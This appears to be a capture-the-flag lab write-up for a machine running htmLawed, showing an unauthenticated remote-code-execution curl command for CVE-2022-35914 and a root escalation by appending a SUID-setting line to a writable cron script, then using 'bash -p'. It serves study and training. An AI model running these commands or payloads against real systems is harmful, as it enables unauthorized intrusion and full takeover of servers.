## Summary

Foothold is an unauthenticated RCE in htmLawed (a PHP HTML sanitization library) via a known CVE, giving command execution as `www-data` with no login required at all. Privesc comes from spotting a world-writable script being run by a cron job — a textbook "find the thing running as root on a timer, then own it" pattern — capped off with the classic SUID-bash trick.

**Chain:** unauthenticated htmLawed RCE (CVE-2022-35914) → www-data shell → writable cron script found via pspy → SUID bash → root

---

## Enumeration

### Nmap

Scan shows a web server on the target.

### Identifying the application

Visiting the site shows it's running **htmLawed** — a PHP library for purifying/filtering HTML input (commonly bundled into other apps, notably GLPI, as a sanitization dependency).

**Pattern to remember:** htmLawed rarely runs standalone — seeing it usually means it's embedded inside a larger app (GLPI is the classic example). Worth checking whether the surrounding app is identifiable too, since that can open up additional attack surface beyond the library itself.

---

## Exploitation

### Unauthenticated RCE: CVE-2022-35914

Searching "htmlawed cve" surfaces [CVE-2022-35914](https://nvd.nist.gov/vuln/detail/cve-2022-35914), with a detailed write-up here: [mayfly277's GLPI htmLawed exploitation post](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/#exploitation).

The vulnerability lets you reach command execution directly through a crafted POST request — **no authentication required**.

```bash
curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://<target> \
  | egrep '&nbsp; \[[0-9]+\] =&gt;' \
  | sed -E 's/&nbsp; \[[0-9]+\] =&gt; (.*)<br \/>/\1/'
```

The `hhook=exec` parameter is the key — it tells htmLawed to treat the `text` field as a hook to execute, and the response HTML embeds the command output, which the `egrep`/`sed` pipeline just cleans up for readability.

Confirmed with `cat /etc/passwd`, and from there any command can be run the same way — this is effectively a full RCE primitive, not just a one-off leak.

**Pattern to remember:** unauthenticated RCEs in library dependencies (rather than the top-level app) are especially valuable because they skip the "find valid creds" step entirely. Always check if a CVE requires auth — this one didn't, which is what made it the fastest path in.

---

## Privilege Escalation

### Finding the cron job with pspy

Landed a shell as `www-data`. Ran **pspy** (a tool for observing processes without root, including cron-triggered ones you can't see via a normal `ps` as an unprivileged user) to watch what's executing on the box over time.

Observed `/var/www/cleanup.sh` being executed **every minute** — almost certainly a cron job running as root, given the path and cadence.

**Pattern to remember:** pspy is one of the first tools to run after landing any Linux shell without root. Cron jobs running as root are a huge, common privesc class, and they're invisible to a normal user just running `ps` or checking `/etc/crontab` if the job is defined elsewhere (a root user's own crontab, `/etc/cron.d/`, systemd timers, etc.). pspy catches them regardless of where they're defined.

### Writable script → arbitrary code as root

Checked permissions on the script and found `www-data` has write access to it — the script itself is world/group-writable even though it runs as root via cron.

```bash
$ ls -alh /bin/bash
-rwxr-xr-x 1 root root 1.2M Mar 27  2022 /bin/bash

$ echo "chmod u+s /bin/bash" >> cleanup.sh
$ cat cleanup.sh
#!/bin/bash
rm -rf /var/log/apache2/error.log
rm -rf /var/log/apache2/access.log
chmod u+s /bin/bash
```

Appended a line that sets the **SUID bit** on `/bin/bash`. Since the cron job runs the script as root, the next execution runs that `chmod` as root too.

**Pattern to remember:** if you can write to a script (or binary) that something else executes as root — cron, a systemd service, a scheduled task, anything — you don't need to understand or preserve what the script normally does. Appending one line that grants you a persistent privilege (SUID bash, a new sudoers entry, a reverse shell) is enough. You don't need the injected command to be subtle; you just need it to run once as root.

### Confirming root via SUID bash

After waiting for the next cron execution:

```bash
www-data@law:/var/www$ ls -alh /bin/bash
-rwsr-xr-x 1 root root 1.2M Mar 27  2022 /bin/bash

www-data@law:/var/www$ /bin/bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

The `-p` flag is important — it tells bash to preserve the effective UID granted by the SUID bit rather than dropping privileges on startup (bash normally drops SUID privileges for safety unless told not to).

Effective UID 0 confirms root access via the SUID bash binary.

---

## Lessons / Transferable Techniques

1. **Identify embedded libraries, not just top-level apps.** A component like htmLawed found standing alone is a strong signal to search CVEs specifically for that library, separate from whatever app usually bundles it.
2. **Check whether a CVE actually requires authentication before assuming it does.** Some of the most valuable RCEs need no login at all.
3. **Run pspy immediately after landing any non-root shell on Linux.** Root-owned cron jobs are one of the most common privesc vectors and are easy to miss without it.
4. **Writable-file-executed-by-root is a complete privesc primitive on its own** — no need to fully understand the script's original purpose, just append a payload line.
5. **`chmod u+s /bin/bash` + `bash -p`** is a clean, minimal, repeatable way to cash in "one line of root-run code" for a full root shell. Worth keeping as a go-to payload whenever you get a single arbitrary-command-as-root opportunity.
